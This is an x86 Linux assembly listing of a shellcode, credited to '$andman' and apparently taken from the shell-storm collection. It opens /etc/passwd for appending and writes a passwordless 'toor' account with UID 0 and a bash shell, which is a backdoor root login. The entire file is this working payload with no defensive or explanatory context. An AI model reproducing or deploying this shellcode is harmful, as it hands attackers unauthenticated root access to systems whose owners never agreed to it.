; Disassembly of 'append /etc/passwd & exit()' - 107 bytes by $andman
; Original: http://shell-storm.org/shellcode/files/shellcode-561.phpapp

global _start

section .text

_start:

jmp short callsc

sc:
pop esi
xor eax,eax
mov [esi+0xb],al
mov [esi+0x2b],al
mov byte [esi+0x2a],0xa
lea ebx,[esi+0xc]
mov [esi+0x2c],ebx
lea ebx,[esi]
mov cx,0x442
mov dx,0x1a4
mov al,0x5
int 0x80

mov ebx,eax
xor edx,edx
mov ecx,[esi+0x2c]
mov dl,0x1f
mov al,0x4
int 0x80

mov al,0x6
int 0x80

mov al,0x1
xor ebx,ebx
int 0x80

callsc:
call sc
str: db '/etc/passwd#toor::0:0:t00r:/root:/bin/bash #'

